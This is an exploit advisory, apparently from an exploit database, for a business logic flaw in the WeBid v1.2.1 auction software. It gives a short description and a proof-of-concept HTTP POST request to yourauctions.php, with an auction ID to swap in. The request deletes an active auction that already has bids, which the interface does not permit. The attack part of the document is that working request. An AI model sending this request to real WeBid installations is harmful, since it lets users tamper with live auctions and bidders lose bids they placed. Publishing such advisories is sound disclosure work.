# Exploit Title: Webid v1.2.1 - Business Logic Error(BLE)
## Date: 2/1/2024
## Vendor Homepage: https://sourceforge.net/projects/simpleauction/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Webid
## Version: v1.2.1
## Exploit Description:
## Webid v1.2.1 suffers from BLE - Business Logic Error Vulnerability allowing attackers to delete an active auction that has bids that can not be deleted in UI.

## ---------------------------------POC-----------------------------
```
POST /yourauctions.php HTTP/1.1
...

csrftoken=78899377e1baac0dedb6f939e65ffad9&O_delete%5B%5D=7(CHANGE HERE)&action=delopenauctions&Submit=Process+selected+auctions
```